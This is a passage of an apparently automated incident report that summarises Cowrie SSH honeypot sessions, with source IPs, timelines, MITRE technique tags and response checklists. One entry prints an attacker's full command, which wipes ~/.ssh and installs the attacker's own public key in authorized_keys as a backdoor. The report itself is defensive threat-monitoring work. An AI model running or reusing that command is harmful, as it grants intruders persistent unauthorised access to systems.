| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:12:14` | `cowrie.session.connect` |
| `2026-07-09 09:12:15` | `cowrie.client.version` |
| `2026-07-09 09:12:15` | `cowrie.client.kex` |
| `2026-07-09 09:12:16` | `cowrie.login.success` |
| `2026-07-09 09:12:16` | `cowrie.direct-tcpip.request` |
| `2026-07-09 09:12:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.183.125[.]51` to AbuseIPDB if not already reported
- [ ] Block `178.183.125[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b90ffeec344c

| Field | Detail |
|---|---|
| **Source IP** | `34.146.217[.]105` |
| **First Seen** | 2026-07-09 09:16 |
| **Last Seen** | 2026-07-09 09:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:16:29` | `cowrie.session.connect` |
| `2026-07-09 09:16:29` | `cowrie.client.version` |
| `2026-07-09 09:16:29` | `cowrie.client.kex` |
| `2026-07-09 09:16:32` | `cowrie.login.success` |
| `2026-07-09 09:16:33` | `cowrie.direct-tcpip.request` |
| `2026-07-09 09:16:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.146.217[.]105` to AbuseIPDB if not already reported
- [ ] Block `34.146.217[.]105` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8aa48f550b5e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 09:19 |
| **Last Seen** | 2026-07-09 09:20 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:19:54` | `cowrie.session.connect` |
| `2026-07-09 09:19:55` | `cowrie.client.version` |
| `2026-07-09 09:19:55` | `cowrie.client.kex` |
| `2026-07-09 09:20:00` | `cowrie.login.success` |
| `2026-07-09 09:20:04` | `cowrie.session.params` |
| `2026-07-09 09:20:04` | `cowrie.command.input` |
| `2026-07-09 09:20:06` | `cowrie.log.closed` |
| `2026-07-09 09:20:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae35f6d76b53

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 09:20 |
| **Last Seen** | 2026-07-09 09:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:20:04` | `cowrie.session.connect` |
| `2026-07-09 09:20:04` | `cowrie.client.version` |
| `2026-07-09 09:20:04` | `cowrie.client.kex` |
| `2026-07-09 09:20:05` | `cowrie.login.success` |
| `2026-07-09 09:20:06` | `cowrie.session.params` |
| `2026-07-09 09:20:06` | `cowrie.command.input` |
| `2026-07-09 09:20:06` | `cowrie.log.closed` |
| `2026-07-09 09:20:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b60884a7df53

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]10` |
| **First Seen** | 2026-07-09 09:27 |
| **Last Seen** | 2026-07-09 09:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:27:44` | `cowrie.session.connect` |
| `2026-07-09 09:27:45` | `cowrie.client.version` |
| `2026-07-09 09:27:45` | `cowrie.client.kex` |
| `2026-07-09 09:27:47` | `cowrie.login.success` |
| `2026-07-09 09:27:47` | `cowrie.direct-tcpip.request` |
| `2026-07-09 09:27:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]10` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e92ca7d7deb

| Field | Detail |
|---|---|
| **Source IP** | `223.210.27[.]53` |
| **First Seen** | 2026-07-09 09:29 |
| **Last Seen** | 2026-07-09 09:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:29:16` | `cowrie.session.connect` |
| `2026-07-09 09:29:16` | `cowrie.client.version` |
| `2026-07-09 09:29:16` | `cowrie.client.kex` |
| `2026-07-09 09:29:18` | `cowrie.login.success` |
| `2026-07-09 09:29:19` | `cowrie.direct-tcpip.request` |
| `2026-07-09 09:29:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.210.27[.]53` to AbuseIPDB if not already reported
- [ ] Block `223.210.27[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ea9171d4c1d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 09:30 |
| **Last Seen** | 2026-07-09 09:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:30:43` | `cowrie.session.connect` |
| `2026-07-09 09:30:43` | `cowrie.client.version` |
| `2026-07-09 09:30:43` | `cowrie.client.kex` |
| `2026-07-09 09:30:43` | `cowrie.login.success` |
| `2026-07-09 09:30:44` | `cowrie.session.params` |
| `2026-07-09 09:30:44` | `cowrie.command.input` |
| `2026-07-09 09:30:44` | `cowrie.log.closed` |
| `2026-07-09 09:30:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75dbf2cd084d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 09:31 |
| **Last Seen** | 2026-07-09 09:31 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:31:00` | `cowrie.session.connect` |
| `2026-07-09 09:31:01` | `cowrie.client.version` |
| `2026-07-09 09:31:01` | `cowrie.client.kex` |
| `2026-07-09 09:31:08` | `cowrie.login.success` |
| `2026-07-09 09:31:11` | `cowrie.session.params` |
| `2026-07-09 09:31:11` | `cowrie.command.input` |
| `2026-07-09 09:31:14` | `cowrie.log.closed` |
| `2026-07-09 09:31:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52b4054763d4

| Field | Detail |
|---|---|
| **Source IP** | `82.193.122[.]91` |
| **First Seen** | 2026-07-09 09:31 |
| **Last Seen** | 2026-07-09 09:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:31:24` | `cowrie.session.connect` |
| `2026-07-09 09:31:25` | `cowrie.client.version` |
| `2026-07-09 09:31:25` | `cowrie.client.kex` |
| `2026-07-09 09:31:26` | `cowrie.login.success` |
| `2026-07-09 09:31:26` | `cowrie.direct-tcpip.request` |
| `2026-07-09 09:31:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.193.122[.]91` to AbuseIPDB if not already reported
- [ ] Block `82.193.122[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9208c5b72fae

| Field | Detail |
|---|---|
| **Source IP** | `14.1.65[.]89` |
| **First Seen** | 2026-07-09 09:31 |
| **Last Seen** | 2026-07-09 09:36 |
| **Session Duration** | 304s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:31:32` | `cowrie.session.connect` |
| `2026-07-09 09:31:33` | `cowrie.client.version` |
| `2026-07-09 09:31:33` | `cowrie.client.kex` |
| `2026-07-09 09:31:36` | `cowrie.login.success` |
| `2026-07-09 09:31:37` | `cowrie.direct-tcpip.request` |
| `2026-07-09 09:36:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.1.65[.]89` to AbuseIPDB if not already reported
- [ ] Block `14.1.65[.]89` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc595678246b

| Field | Detail |
|---|---|
| **Source IP** | `110.227.215[.]90` |
| **First Seen** | 2026-07-09 09:32 |
| **Last Seen** | 2026-07-09 09:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:32:50` | `cowrie.session.connect` |
| `2026-07-09 09:32:51` | `cowrie.client.version` |
| `2026-07-09 09:32:51` | `cowrie.client.kex` |
| `2026-07-09 09:32:52` | `cowrie.login.success` |
| `2026-07-09 09:32:53` | `cowrie.direct-tcpip.request` |
| `2026-07-09 09:32:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.227.215[.]90` to AbuseIPDB if not already reported
- [ ] Block `110.227.215[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00a2e593dfdb

| Field | Detail |
|---|---|
| **Source IP** | `27.107.102[.]154` |
| **First Seen** | 2026-07-09 09:33 |
| **Last Seen** | 2026-07-09 09:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:33:02` | `cowrie.session.connect` |
| `2026-07-09 09:33:03` | `cowrie.client.version` |
| `2026-07-09 09:33:03` | `cowrie.client.kex` |
| `2026-07-09 09:33:06` | `cowrie.login.success` |
| `2026-07-09 09:33:06` | `cowrie.direct-tcpip.request` |
| `2026-07-09 09:33:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.107.102[.]154` to AbuseIPDB if not already reported
- [ ] Block `27.107.102[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71bfbf512ef0

| Field | Detail |
|---|---|
| **Source IP** | `191.241.142[.]170` |
| **First Seen** | 2026-07-09 09:38 |
| **Last Seen** | 2026-07-09 09:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:38:01` | `cowrie.session.connect` |
| `2026-07-09 09:38:02` | `cowrie.client.version` |
| `2026-07-09 09:38:02` | `cowrie.client.kex` |
| `2026-07-09 09:38:04` | `cowrie.login.success` |
| `2026-07-09 09:38:04` | `cowrie.direct-tcpip.request` |
| `2026-07-09 09:38:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.241.142[.]170` to AbuseIPDB if not already reported
- [ ] Block `191.241.142[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c1088758164

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 09:40 |
| **Last Seen** | 2026-07-09 09:40 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:40:38` | `cowrie.session.connect` |
| `2026-07-09 09:40:39` | `cowrie.client.version` |
| `2026-07-09 09:40:39` | `cowrie.client.kex` |
| `2026-07-09 09:40:45` | `cowrie.login.success` |
| `2026-07-09 09:40:47` | `cowrie.session.params` |
| `2026-07-09 09:40:47` | `cowrie.command.input` |
| `2026-07-09 09:40:49` | `cowrie.log.closed` |
| `2026-07-09 09:40:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a94ea9cb62d7

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 09:40 |
| **Last Seen** | 2026-07-09 09:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:40:50` | `cowrie.session.connect` |
| `2026-07-09 09:40:50` | `cowrie.client.version` |
| `2026-07-09 09:40:50` | `cowrie.client.kex` |
| `2026-07-09 09:40:50` | `cowrie.login.success` |
| `2026-07-09 09:40:51` | `cowrie.direct-tcpip.request` |
| `2026-07-09 09:40:51` | `cowrie.direct-tcpip.data` |
| `2026-07-09 09:40:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7592b48b03ca

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 09:41 |
| **Last Seen** | 2026-07-09 09:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:41:34` | `cowrie.session.connect` |
| `2026-07-09 09:41:34` | `cowrie.client.version` |
| `2026-07-09 09:41:34` | `cowrie.client.kex` |
| `2026-07-09 09:41:35` | `cowrie.login.success` |
| `2026-07-09 09:41:36` | `cowrie.session.params` |
| `2026-07-09 09:41:36` | `cowrie.command.input` |
| `2026-07-09 09:41:36` | `cowrie.log.closed` |
| `2026-07-09 09:41:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae76dbcaa46f

| Field | Detail |
|---|---|
| **Source IP** | `223.25.108[.]2` |
| **First Seen** | 2026-07-09 09:42 |
| **Last Seen** | 2026-07-09 09:42 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:42:19` | `cowrie.session.connect` |
| `2026-07-09 09:42:20` | `cowrie.client.version` |
| `2026-07-09 09:42:20` | `cowrie.client.kex` |
| `2026-07-09 09:42:24` | `cowrie.login.success` |
| `2026-07-09 09:42:26` | `cowrie.direct-tcpip.request` |
| `2026-07-09 09:42:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.25.108[.]2` to AbuseIPDB if not already reported
- [ ] Block `223.25.108[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ce5517bb355

| Field | Detail |
|---|---|
| **Source IP** | `50.84.211[.]204` |
| **First Seen** | 2026-07-09 09:45 |
| **Last Seen** | 2026-07-09 09:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:45:42` | `cowrie.session.connect` |
| `2026-07-09 09:45:42` | `cowrie.client.version` |
| `2026-07-09 09:45:42` | `cowrie.client.kex` |
| `2026-07-09 09:45:42` | `cowrie.login.success` |
| `2026-07-09 09:45:43` | `cowrie.session.params` |
| `2026-07-09 09:45:43` | `cowrie.command.input` |
| `2026-07-09 09:45:43` | `cowrie.command.failed` |
| `2026-07-09 09:45:43` | `cowrie.log.closed` |
| `2026-07-09 09:45:44` | `cowrie.session.params` |
| `2026-07-09 09:45:44` | `cowrie.command.input` |
| `2026-07-09 09:45:44` | `cowrie.session.file_download` |
| `2026-07-09 09:45:44` | `cowrie.log.closed` |
| `2026-07-09 09:45:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.84.211[.]204` to AbuseIPDB if not already reported
- [ ] Block `50.84.211[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb04ac085233

| Field | Detail |
|---|---|
| **Source IP** | `50.84.211[.]204` |
| **First Seen** | 2026-07-09 09:45 |
| **Last Seen** | 2026-07-09 09:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:45:44` | `cowrie.session.connect` |
| `2026-07-09 09:45:44` | `cowrie.client.version` |
| `2026-07-09 09:45:44` | `cowrie.client.kex` |
| `2026-07-09 09:45:44` | `cowrie.login.success` |
| `2026-07-09 09:45:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.84.211[.]204` to AbuseIPDB if not already reported
- [ ] Block `50.84.211[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee216dc25fe8

| Field | Detail |
|---|---|
| **Source IP** | `50.84.211[.]204` |
| **First Seen** | 2026-07-09 09:45 |
| **Last Seen** | 2026-07-09 09:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:45:44` | `cowrie.session.connect` |
| `2026-07-09 09:45:44` | `cowrie.client.version` |
| `2026-07-09 09:45:44` | `cowrie.client.kex` |
| `2026-07-09 09:45:44` | `cowrie.login.success` |
| `2026-07-09 09:45:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.84.211[.]204` to AbuseIPDB if not already reported
- [ ] Block `50.84.211[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5a47512bca0

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-09 09:46 |
| **Last Seen** | 2026-07-09 09:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:46:06` | `cowrie.session.connect` |
| `2026-07-09 09:46:06` | `cowrie.client.version` |
| `2026-07-09 09:46:06` | `cowrie.client.kex` |
| `2026-07-09 09:46:07` | `cowrie.login.success` |
| `2026-07-09 09:46:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30ddd9c790bb

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-09 09:46 |
| **Last Seen** | 2026-07-09 09:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:46:06` | `cowrie.session.connect` |
| `2026-07-09 09:46:06` | `cowrie.client.version` |
| `2026-07-09 09:46:06` | `cowrie.client.kex` |
| `2026-07-09 09:46:07` | `cowrie.login.success` |
| `2026-07-09 09:46:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e2c087ea7ea

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-09 09:50 |
| **Last Seen** | 2026-07-09 09:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:50:39` | `cowrie.session.connect` |
| `2026-07-09 09:50:39` | `cowrie.client.version` |
| `2026-07-09 09:50:39` | `cowrie.client.kex` |
| `2026-07-09 09:50:40` | `cowrie.login.success` |
| `2026-07-09 09:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0946e241f008

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-09 09:50 |
| **Last Seen** | 2026-07-09 09:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:50:40` | `cowrie.session.connect` |
| `2026-07-09 09:50:40` | `cowrie.client.version` |
| `2026-07-09 09:50:40` | `cowrie.client.kex` |
| `2026-07-09 09:50:40` | `cowrie.login.success` |
| `2026-07-09 09:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3626f59e989e

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-09 09:50 |
| **Last Seen** | 2026-07-09 09:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:50:48` | `cowrie.session.connect` |
| `2026-07-09 09:50:48` | `cowrie.client.version` |
| `2026-07-09 09:50:48` | `cowrie.client.kex` |
| `2026-07-09 09:50:48` | `cowrie.login.success` |
| `2026-07-09 09:50:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3460afbb76bb

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-09 09:50 |
| **Last Seen** | 2026-07-09 09:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:50:49` | `cowrie.session.connect` |
| `2026-07-09 09:50:49` | `cowrie.client.version` |
| `2026-07-09 09:50:49` | `cowrie.client.kex` |
| `2026-07-09 09:50:49` | `cowrie.login.success` |
| `2026-07-09 09:50:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a0e58eda5f6

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 09:51 |
| **Last Seen** | 2026-07-09 09:51 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 09:51:19` | `cowrie.session.connect` |
